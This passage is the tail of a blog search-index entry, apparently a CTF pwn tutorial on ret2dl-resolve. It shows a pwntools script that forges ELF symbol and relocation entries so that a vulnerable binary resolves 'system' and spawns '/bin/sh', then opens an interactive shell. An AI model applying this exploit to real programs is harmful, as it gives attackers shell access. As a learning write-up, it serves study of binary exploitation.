dynstr<br>st_bind = <span class="hljs-number">0x1</span><br>st_type = <span class="hljs-number">0x2</span><br>st_info = (st_bind &lt;&lt; <span class="hljs-number">4</span>) + (st_type &amp; <span class="hljs-number">0xf</span>)<br>fake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(st_info) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_6 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_6 += p32(plt_0)<br>payload_6 += p32(reloc_index)<br>payload_6 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_6 += p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_6 += fake_reloc<br>payload_6 += fake_sym<br>payload_6 += <span class="hljs-string">&quot;system\x00&quot;</span>          <br>payload_6 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_6))<br>payload_6 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_6 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_6))<br>sh.send(payload_6)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn：从入门到入坟</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dl-resolve</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
